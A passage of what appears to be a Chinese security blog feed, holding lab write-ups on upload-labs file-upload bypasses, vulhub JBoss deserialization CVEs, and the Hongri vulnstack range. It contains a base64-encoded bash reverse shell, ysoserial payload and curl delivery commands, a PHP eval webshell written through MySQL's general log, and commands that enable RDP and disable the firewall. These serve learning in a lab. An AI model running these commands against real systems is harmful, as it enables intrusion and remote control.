class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">renameFile</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>具体的操作就是我们把文件的后缀改成.php.7z即可</p><p><img src="/../image/image-20240816121612972.png" alt="image-20240816121612972"></p><p>然后借助文件包含来访问</p><p><img src="/../image/image-20240816122045773.png" alt="image-20240816122045773"></p><p>也可以利用图片马的方式还有条件竞争的方式，这里就不过多演示了</p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p><img src="/../image/image-20240816122259564.png" alt="image-20240816122259564"></p><p>这一关我们可以控制两个param，看看源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只对保存名称进行了过滤，所以我们需要绕过的也是save_name，抓包</p><p><img src="/../image/image-20240816123015888.png" alt="image-20240816123015888"></p><p>这里有两种方式绕过，可以%00截断</p><p><img src="/../image/image-20240816123454420.png" alt="image-20240816123454420"></p><p>但之前用过了，这里就不测试了，我们用move_uploaded_file()的另一个特性，会忽略掉文件末尾的 <code>/.</code></p><p><img src="/../image/image-20240816123530076.png" alt="image-20240816123530076"></p><p>访问解析</p><p><img src="/../image/image-20240816123605958.png" alt="image-20240816123605958"></p><h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2><p>这一关白名单<br>验证过程：</p><ol><li>验证上传路径是否存在</li><li>验证[‘upload_file’]的content-type是否合法（可以抓包修改）</li><li>判断POST参数是否为空定义$file变量（关键：构造数组绕过下一步的判断）</li><li>判断file不是数组则使用explode(‘.’, strtolower($file))对file进行切割，将file变为一个数组</li><li>判断数组最后一个元素是否合法</li><li>数组第一位和$file[count($file) - 1]进行拼接，产生保存文件名file_name</li><li>上传文件</li></ol><p>首先判断上传的文件类型是否属于: <code>image/jpeg</code>, <code>image/png</code>, <code>image/gif</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查MIME</span></span><br><span class="line">   <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br></pre></td></tr></table></figure><p>然后检测上传的文件名称是否为数组, 若不为数组, 则使用explode函数将文件名按照“.”进行分割, 并将结果转换为小写, 这个 <code>$file</code> 会是一个数组, 数组的第一项是文件名，第二项是文件扩展名</p><p>也就是说如果我们上传的文件名称若为数组, 那么他就不会执行这行代码, 而是继续往下执行代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">           <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&quot;upload . php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240816130053390.png" alt="image-20240816130053390"></p><p>例如此处我传递了两个数组元素, 分别是<code>save_name[0]=upload.php</code>和<code>save_name[2]=jpg</code></p><p><code>end($file)</code> 获取到的就是这个数组的最后一个元素，也就是文件扩展名, 然后对这个扩展名进行检验, 由于我们构造数组的最后一个元素为白名单后缀jpg, 因此能够上传文件</p><p>使用 <code>reset()</code> 函数获取数组的第一个元素,即<code>upload.php</code> , <code>$file[count-1]</code>的值为空(下面的代码很好解释了此值为何为空), 最终<code>$file_name</code>的值为<code>upload.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>可以测试下上面的流程</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$save_name</span>[<span class="number">0</span>] = <span class="string">&quot;upload.php&quot;</span>;</span><br><span class="line"><span class="variable">$save_name</span>[<span class="number">2</span>] = <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$save_name</span>)); <span class="comment">//输出数组的个数:2</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$save_name</span>));<span class="comment">//输出jpg</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$save_name</span>));<span class="comment">//输出upload.php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$save_name</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$save_name</span>) - <span class="number">1</span>]); <span class="comment">//输出$save_name[1]的值:空</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240816125700625.png" alt="image-20240816125700625"></p><p>我们要改的就是下面的要求</p><p>修改content-type<br>修改POST参数为数组类型，索引[0]为<code>upload-20.php</code>，索引[2]为<code>jpg|png|gif</code>。<br>只要第二个索引<code>不为1</code>，$file[count($file) - 1]就等价于$file[2-1]，值为空</p><p><img src="/../image/image-20240816130359822.png" alt="image-20240816130359822"></p><p>多的我们可以自己新建一个，注意空行就行，访问解析</p><p><img src="/../image/image-20240816130449255.png" alt="image-20240816130449255"></p><p>到这里就结束了，总结一下</p><p><img src="/../image/xmind/upload-labs.png" alt="xmind-1"></p><p>防护手段</p><p><img src="/../image/image-20240816140441102.png" alt="image-20240816140441102"></p>]]></content>
      
      
      
        <tags>
            
            <tag> upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulhub-Jboss</title>
      <link href="/2024/08/14/vulhub-Jboss/"/>
      <url>/2024/08/14/vulhub-Jboss/</url>
      
        <content type="html"><![CDATA[<p><em>参考链接:</em></p><p><em><a href="https://www.cnblogs.com/arrest/articles/17509983.html">https://www.cnblogs.com/arrest/articles/17509983.html</a></em></p><p><em><a href="https://paper.seebug.org/312/#6-java-apache-commonscollections-rce">https://paper.seebug.org/312/#6-java-apache-commonscollections-rce</a></em></p><p><em><a href="https://blog.csdn.net/fuhanghang/article/details/104370187">https://blog.csdn.net/fuhanghang/article/details/104370187</a></em></p><p><em><a href="https://blog.csdn.net/weixin_45605352/article/details/120305428">https://blog.csdn.net/weixin_45605352/article/details/120305428</a></em></p><h1 id="JBoss-JMXInvokerServlet-反序列化漏洞（CVE-2015-7501"><a href="#JBoss-JMXInvokerServlet-反序列化漏洞（CVE-2015-7501" class="headerlink" title="JBoss JMXInvokerServlet 反序列化漏洞（CVE-2015-7501"></a>JBoss JMXInvokerServlet 反序列化漏洞（CVE-2015-7501</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>这是经典的JBoss反序列化漏洞，JBoss在<code>/invoker/JMXInvokerServlet</code>请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>JBoss在处理&#x2F;invoker&#x2F;JMXInvokerServlet请求的时候读取了对象，所以我们直接将ysoserial生成好的POC附在POST Body中发送即可。</p><p>此漏洞存在于JBoss中 &#x2F;invoker&#x2F;JMXInvokerServlet 路径。访问若提示下载 JMXInvokerServlet，则可能存在漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞验证，访问<code>http://your-ip:8080/invoker/JMXInvokerServlet</code>提示下载文件，则可能存在漏洞：</p><p><img src="/../image/image-20240814162057558.png" alt="image-20240814162057558"></p><p>Boss在处理<code>/invoker/JMXInvokerServlet</code>请求的时候读取了对象，所以我们直接将<a href="https://github.com/frohoff/ysoserial">ysoserial</a>生成好的POC附在POST Body中发送即可。整个过程和 CVE-2017-12149很像。</p><p>反弹shell编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.174.137/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMzcvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>生成序列化payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMzcvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; test.ser</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240814162616309.png" alt="image-20240814162616309"></p><p>用curl以post请求传递payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://192.168.174.137:8080/invoker/JMXInvokerServlet --data-binary @test.ser --output 1</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240814162800650.png" alt="image-20240814162800650"></p><h1 id="JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）"><a href="#JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）" class="headerlink" title="JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）"></a>JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</h1><h2 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的<code>JMS over HTTP Invocation Layer</code>的<code>HTTPServerILServlet.java</code>文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>与CVE-2015-7501的漏洞如出一辙，只是利用的路径稍微出现了变化。</p><p>该漏洞出现在<code>/jbossmq-httpil/HTTPServerILServlet</code>请求中，若访问200，则可能存在漏洞。</p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问目标目录</p><p><img src="/../image/image-20240814190102560.png" alt="image-20240814190102560"></p><p>可以成功访问，同样的方法走一遍</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMzcvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; test.ser</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://192.168.174.137:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @test.ser --output 1</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240814190554084.png" alt="image-20240814190554084"></p><p><img src="/../image/image-20240814190542255.png" alt="image-20240814190542255"></p><h2 id="JBoss-5-x-x2F-6-x-反序列化漏洞（CVE-2017-12149）漏洞描述"><a href="#JBoss-5-x-x2F-6-x-反序列化漏洞（CVE-2017-12149）漏洞描述" class="headerlink" title="JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）漏洞描述"></a>JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）漏洞描述</h2><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。其doFilter方法在没有进行任何安全检查和限制的情况下尝试将来自客户端的序列化数据流进行反序列化，导致攻击者可以通过精心设计的序列化数据来执行任意代码。</p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该漏洞出现在<code>/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化，导致传入的携带恶意代码的序列化数据执行。</p><p>访问<code>/invoker/readonly</code>， 如果出现报 500 错误，则说明目标机器可能存在此漏洞。</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问<code>http://192.168.174.137:8080/invoker/readonly</code>，则可能存在漏洞：</p><p><img src="/../image/image-20240814191944232.png" alt="image-20240814191944232"></p><p><img src="/../image/image-20240814192250579.png" alt="image-20240814192250579"></p><p>一样的过程，就是路径不一样</p>]]></content>
      
      
      
        <tags>
            
            <tag> Jboss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日-day1</title>
      <link href="/2024/08/13/%E7%BA%A2%E6%97%A5-day1/"/>
      <url>/2024/08/13/%E7%BA%A2%E6%97%A5-day1/</url>
      
        <content type="html"><![CDATA[<h1 id="红日靶场"><a href="#红日靶场" class="headerlink" title="红日靶场"></a>红日靶场</h1><h2 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h2><p><img src="/../image/image-20240714194756740-1723540470168-1.png" alt="image-20240714194756740"></p><p><img src="/../image/image-20240714204701493-1723540470169-3.png" alt="image-20240714204701493"></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h4><p>设置多网卡，直接在vm里添加网卡即可</p><p><img src="/../image/image-20240714205207287-1723540470169-2.png" alt="image-20240714205207287"></p><h5 id="修改ip"><a href="#修改ip" class="headerlink" title="修改ip"></a>修改ip</h5><p><img src="/../image/image-20240714205318977-1723540470169-5.png" alt="image-20240714205318977"></p><p>再搭建另一个网卡，这里不能选连接到此网络，模拟真实环境</p><p><img src="/../image/image-20240714205423295-1723540470169-6.png" alt="image-20240714205423295"></p><p>让虚拟机吃上网卡，vulnstack-win7</p><p><img src="/../image/image-20240714205651657-1723540470169-4.png" alt="image-20240714205651657"></p><p>密码hongrisec@2019，进去后ipconfig一下，看看网卡装上没</p><p><img src="/../image/image-20240714210031171-1723540470169-7.png" alt="image-20240714210031171"></p><p>配置ip地址</p><p>公网：192.168.111.128</p><p>内网：192.168.52.149</p><h5 id="公网"><a href="#公网" class="headerlink" title="公网"></a><strong>公网</strong></h5><p><img src="/../image/image-20240714230422440-1723540470169-10.png" alt="image-20240714230422440"></p><h5 id="内网（141改138，要域控的地址）所以后面有一段是脱域了"><a href="#内网（141改138，要域控的地址）所以后面有一段是脱域了" class="headerlink" title="内网（141改138，要域控的地址）所以后面有一段是脱域了"></a><strong>内网</strong>（141改138，要域控的地址）所以后面有一段是脱域了</h5><p><img src="/../image/image-20240714230806133-1723540470169-9.png" alt="image-20240714230806133"></p><p>配置好后</p><p><img src="/../image/image-20240714231050155-1723540470169-8.png" alt="image-20240714231050155"></p><p><img src="/../image/image-20240714231112868-1723540470169-12.png" alt="image-20240714231112868"></p><p>把win7的防火墙关了，用本机ping一下</p><p><img src="/../image/image-20240714231256541-1723540470169-13.png" alt="image-20240714231256541"></p><p>说明可以访问，再ping一下内网</p><p><img src="/../image/image-20240714231409124-1723540470169-11.png" alt="image-20240714231409124"></p><p>ping不通才是正常的</p><h4 id="域控win2008"><a href="#域控win2008" class="headerlink" title="域控win2008"></a>域控win2008</h4><p><img src="/../image/image-20240714231724411-1723540470169-14.png" alt="image-20240714231724411"></p><p>记得用内网网卡</p><p><img src="/../image/image-20240714231752843-1723540470169-15.png" alt="image-20240714231752843"></p><h4 id="域内主机"><a href="#域内主机" class="headerlink" title="域内主机"></a>域内主机</h4><p><img src="/../image/image-20240714231834267-1723540470169-17.png" alt="image-20240714231834267"></p><h3 id="内网渗透中的基本环境和账号"><a href="#内网渗透中的基本环境和账号" class="headerlink" title="内网渗透中的基本环境和账号"></a>内网渗透中的基本环境和账号</h3><p>​电脑的身份就是两种，第一种是本地工作，第二种是域，我们默认的电脑都是本地工作组的形式。综合靶场的渗透，这两种环境一定要分辨清楚，这个非常重要</p><p>​一个大型单位里,打能有成百上千台计算机互相连接组成局域网,如果不对这些计算机进行分组,网络的混乱程度是可想而知的 为了解决这一问题,产生了工作组( Work Group)这个概念。将不同的计算机按功能(或部门)分别列入不同的工作组,例如技术部的计算机都列入”技术部“工作组、行政部的计算机都 列入”行政部“工作组。相比不分组的情况,这样的情况有序得多(尤其对大型局域 网来说)。</p><p>​每个人的电脑默认是工作组形式存在</p><p><img src="/../image/image-20240714232324597-1723540470169-18.png" alt="image-20240714232324597"></p><p>但工作组有个弊端，没有集中统计管理，可以随便换，而且没有统一的分发机制。而域控就可以对这些电脑统一控制，域控就是域环境的控制器</p><p>为了解决工作的不方便性，提出了域这个概念</p><p>域(Domain)是一个有安全边界的计算机集合，可以简单地把域理解成升级版的工作组。与工作组相比,域的安全管理控制机制更加严格。用户要想访问域内的资源,必须以合法的身份登录域,而用户对域内的资源拥有什么样的权限,还取决于用户在域内的身份</p><p><img src="/../image/image-20240714233903406-1723540470169-16.png" alt="image-20240714233903406"></p><p>既然存在工作组和域两种形式的环境，那么针对于电脑而言，就有两种形式的账号</p><p>内网账号分类</p><p>​1、工作组账号(本地账号)</p><p>​2、域环境账号(域账号)<br>账号存储位置</p><p>​1、本地账号在本地的机器上</p><p>​2、域账号在域控上</p><p>账号识别</p><p>​1、工作组账号(机器名\账户名)</p><p>​2、域账号(域名\账户名)</p><p><img src="/../image/image-20240714234335240-1723540470169-19.png" alt="image-20240714234335240"></p><p>就比如YOUZIPII\yxz就是一个本地账号，域账号就是GOD(域名)\yxz，进入到web服务器</p><p><img src="/../image/image-20240714234850953-1723540470169-20.png" alt="image-20240714234850953"></p><p>这个god目前还不知道是什么账号，我们可以进去看一下hostname</p><p><img src="/../image/image-20240714234940547-1723540470169-21.png" alt="image-20240714234940547"></p><p>可以看到hostname是stu1，所以god应该就是域名了，所以我们可以到域控里登陆这个账号试试</p><p><img src="/../image/image-20240714235046761-1723540470169-22.png" alt="image-20240714235046761"></p><p><img src="/../image/image-20240714235152588-1723540470169-23.png" alt="image-20240714235152588"></p><p><img src="/../image/image-20240714235203073-1723540470169-25.png" alt="image-20240714235203073"></p><p>提示密码过期，更改一下</p><p><img src="/../image/image-20240714235222523-1723540470169-26.png" alt="image-20240714235222523"></p><p>还有复杂度要求，那就改成admin@123把</p><p><img src="/../image/image-20240714235345867-1723540470169-24.png" alt="image-20240714235345867"></p><p>这时，三台主机就都被更改了，域控主机也可以用这个登陆，域控账号可以登陆域内任意一台电脑，对于多个域有各自的域账号，拿到域控就基本打穿了</p><p><img src="/../image/image-20240714235506989-1723540470169-27.png" alt="image-20240714235506989"></p><p><img src="/../image/image-20240714235519209-1723540470170-29.png" alt="image-20240714235519209"></p><h3 id="渗透测试第一步信息收集技术"><a href="#渗透测试第一步信息收集技术" class="headerlink" title="渗透测试第一步信息收集技术"></a>渗透测试第一步信息收集技术</h3><p>先把web服务开起来，记得先重启一下</p><p><img src="/../image/image-20240715000458430-1723540470170-30.png" alt="image-20240715000458430"></p><p>信息收集就是收集目标的相关信息，其中包含了</p><ol><li>iP地址</li><li>子域名</li><li>目录结构</li><li>JS信息</li><li>APP和小程序</li><li>端口</li><li>旁站</li><li>C段</li><li>whois信息</li><li>公司相关手机邮箱。</li></ol><h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><p>御剑扫描</p><p><img src="/../image/image-20240715000638185-1723540470169-28.png" alt="image-20240715000638185"></p><p>可以发现开了80、135、139、445、3306端口</p><p><img src="/../image/image-20240715000715393-1723540470170-31.png" alt="image-20240715000715393"></p><p>不同端口对应不同服务，访问80端口看看web服务</p><p><img src="/../image/image-20240715000815566-1723540470170-32.png" alt="image-20240715000815566"></p><h4 id="打点技术和漏洞挖掘思路"><a href="#打点技术和漏洞挖掘思路" class="headerlink" title="打点技术和漏洞挖掘思路"></a>打点技术和漏洞挖掘思路</h4><p>目录扫描</p><p><img src="/../image/image-20240715143053529-1723540470170-33.png" alt="image-20240715143053529"></p><p><img src="/../image/image-20240715143122240-1723540470170-34.png" alt="image-20240715143122240"></p><p><img src="/../image/image-20240715143144501-1723540470170-38.png" alt="image-20240715143144501"></p><h4 id="漏洞搜索与利用历史漏洞"><a href="#漏洞搜索与利用历史漏洞" class="headerlink" title="漏洞搜索与利用历史漏洞"></a>漏洞搜索与利用历史漏洞</h4><h5 id="phpmyadmin爆破"><a href="#phpmyadmin爆破" class="headerlink" title="phpmyadmin爆破"></a>phpmyadmin爆破</h5><p><img src="/../image/image-20240715150339391-1723540470170-35.png" alt="image-20240715150339391"></p><p><img src="/../image/image-20240715150420040-1723540470170-40.png" alt="image-20240715150420040"></p><p><img src="/../image/image-20240715150443259-1723540470170-36.png" alt="image-20240715150443259"></p><p>都是基于字典的爆破，顺便补充一下四种爆破的区别</p><p><a href="https://blog.csdn.net/qq_39101049/article/details/90234669">https://blog.csdn.net/qq_39101049/article/details/90234669</a></p><p>但结果好像不太行，换了一种工具PMAcrack破解了root:root</p><p><img src="/../image/image-20240715151506971-1723540470170-39.png" alt="image-20240715151506971"></p><h5 id="PhpMyadmin-GetShell"><a href="#PhpMyadmin-GetShell" class="headerlink" title="PhpMyadmin GetShell"></a>PhpMyadmin GetShell</h5><p>通过日志getshell，原理如下</p><p>general log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell:</p><p>第一步：查看当前的日志配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;general%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715152510312-1723540470170-37.png" alt="image-20240715152510312"></p><p>当前日志是关闭的，且存的目录也一起打印了</p><p>第二步：开启日志</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log = on;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715152721039-1723540470170-41.png" alt="image-20240715152721039"></p><p>开启后，一些操作就会被记录到这里，但我们没法访问这个文件，所以我们需要改变这个路径</p><p>第三步：自定义日志路径</p><p><img src="/../image/image-20240715152951579-1723540470170-43.png" alt="image-20240715152951579"></p><p>在探针中包含了两个路径，我们可以随便挑一个来写木马，这里我们新建一个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log_file=&#x27;C:/phpStudy/WWW/yxz.php&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715153238139-1723540470170-44.png" alt="image-20240715153238139"></p><p><img src="/../image/image-20240715153311205-1723540470170-42.png" alt="image-20240715153311205"></p><p>成功访问日志</p><p>第四步：执行查询让日志记录木马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715153730208-1723540470170-45.png" alt="image-20240715153730208"></p><p>成功记录在文件里了，</p><p>常见连接shell工具</p><ol><li>蚁剑 php 2015-2020 </li><li>哥斯拉 java 2020-现在 </li><li>冰蝎</li><li>菜刀 asp 80 2000-2010</li></ol><p>这里用蚁剑连</p><p>第五步：蚁剑连接shell</p><p><img src="/../image/image-20240715161218793-1723540470170-47.png" alt="image-20240715161218793"></p><p><img src="/../image/image-20240715161227643-1723540470170-46.png" alt="image-20240715161227643"></p><p><img src="/../image/image-20240715161246896-1723540470170-48.png" alt="image-20240715161246896"></p><p><img src="/../image/image-20240715161346371-1723540470170-49.png" alt="image-20240715161346371"></p><p>进入shell看看账号，发现域账号</p><h5 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h5><p>查看3389端口是否开放</p><p><img src="/../image/image-20240715161554112-1723540470170-50.png" alt="image-20240715161554112"></p><p>没有，那我们需要给他开启</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715161743108-1723540470170-51.png" alt="image-20240715161743108"></p><p><img src="/../image/image-20240715161852487-1723540470170-52.png" alt="image-20240715161852487"></p><p>远程关闭防火墙</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh firewall show state</span><br><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715162107970-1723540470170-55.png" alt="image-20240715162107970"></p><p><img 